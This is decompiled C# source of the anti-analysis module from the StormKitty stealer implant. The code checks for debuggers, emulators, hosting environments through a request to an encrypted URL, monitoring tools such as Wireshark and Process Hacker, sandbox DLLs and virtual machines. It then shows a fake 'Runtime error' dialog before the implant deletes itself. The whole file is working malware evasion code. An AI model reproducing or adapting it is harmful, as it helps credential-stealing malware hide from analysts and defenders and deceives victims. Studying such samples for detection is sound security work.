using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace StormKitty.Implant
{
	// Token: 0x02000054 RID: 84
	internal sealed class AntiAnalysis
	{
		// Token: 0x06000178 RID: 376
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x06000179 RID: 377
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x0600017A RID: 378 RVA: 0x0000D0B8 File Offset: 0x0000B2B8
		private static bool Debugger()
		{
			bool result = false;
			try
			{
				AntiAnalysis.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref result);
				return result;
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600017B RID: 379 RVA: 0x0000D0F4 File Offset: 0x0000B2F4
		private static bool Emulator()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600017C RID: 380 RVA: 0x0000D148 File Offset: 0x0000B348
		private static bool Hosting()
		{
			try
			{
				return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[]
				{
					150,
					74,
					225,
					199,
					246,
					42,
					22,
					12,
					92,
					2,
					165,
					125,
					115,
					20,
					210,
					212,
					231,
					87,
					111,
					21,
					89,
					98,
					65,
					247,
					202,
					71,
					238,
					24,
					143,
					201,
					231,
					207,
					181,
					18,
					199,
					100,
					99,
					153,
					55,
					114,
					55,
					39,
					135,
					191,
					144,
					26,
					106,
					93
				})).Contains("true");
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600017D RID: 381 RVA: 0x0000D19C File Offset: 0x0000B39C
		private static bool Processes()
		{
			Process[] processes = Process.GetProcesses();
			string[] source = new string[]
			{
				"processhacker",
				"netstat",
				"netmon",
				"tcpview",
				"wireshark",
				"filemon",
				"regmon",
				"cain"
			};
			foreach (Process process in processes)
			{
				if (source.Contains(process.ProcessName.ToLower()))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600017E RID: 382 RVA: 0x0000D224 File Offset: 0x0000B424
		private static bool SandBox()
		{
			string[] array = new string[]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (AntiAnalysis.GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600017F RID: 383 RVA: 0x0000D284 File Offset: 0x0000B484
		private static bool VirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000180 RID: 384 RVA: 0x0000D430 File Offset: 0x0000B630
		public static bool Run()
		{
			if (Config.AntiAnalysis == "1")
			{
				if (AntiAnalysis.Hosting())
				{
					return true;
				}
				if (AntiAnalysis.Processes())
				{
					return true;
				}
				if (AntiAnalysis.VirtualBox())
				{
					return true;
				}
				if (AntiAnalysis.SandBox())
				{
					return true;
				}
				if (AntiAnalysis.Emulator())
				{
					return true;
				}
				if (AntiAnalysis.Debugger())
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000181 RID: 385 RVA: 0x0000D488 File Offset: 0x0000B688
		public static void FakeErrorMessage()
		{
			string text = StringsCrypt.GenerateRandomData("1");
			text = "0x" + text.Substring(0, 5);
			MessageBox.Show("Exit code " + text, "Runtime error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Hand);
			SelfDestruct.Melt();
		}
	}
}
